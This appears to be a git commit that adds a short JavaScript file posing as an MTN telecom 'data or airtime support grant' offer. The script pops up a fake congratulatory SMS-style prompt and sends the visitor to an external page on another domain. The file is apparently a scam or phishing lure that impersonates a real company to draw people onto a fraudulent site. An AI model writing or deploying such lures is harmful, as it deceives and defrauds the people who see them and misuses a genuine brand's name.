ab37f6e52e313043982cbfb7c07ad9ce679b30f2
sureoffer <emesire247@gmail.com>
2025-06-05 07:17:13 -0700

    Create activation-mtnafricadata.com.js

---
+++ activation-mtnafricadata.com.js
@@ -0,0 +1,5 @@
+var password = 'ACTIVATE NOW'
+password=prompt('SMS: Congratulations, You Are Among The Selected Valuded Customer To Receive Data Or Airtime Bundle Support Grant From MTN , Press Activate Now ','ACTIVATE NOW');
+if (password != 'ACTIVATE NOW') {
+location.href='https://emesire.xyz/mtnafricadata.com.html';
+}
